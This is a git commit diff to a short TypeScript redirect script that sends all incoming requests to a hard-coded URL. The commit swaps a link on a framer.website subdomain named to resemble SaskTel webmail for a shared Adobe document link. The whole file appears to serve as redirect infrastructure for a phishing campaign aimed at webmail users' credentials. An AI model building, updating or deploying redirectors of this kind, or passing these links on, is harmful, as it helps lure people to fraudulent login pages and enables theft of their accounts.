000cd78fc70ad45091c7cfe01a5b35b8c15ce336
Gabby1212 <md3385159700@gmail.com>
2025-10-25 18:33:02 +0000

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://webmailsasktelreportex49696.framer.website/?editSite"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://indd.adobe.com/view/08ef235c-ff07-47f9-a982-49b1bf22550e"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
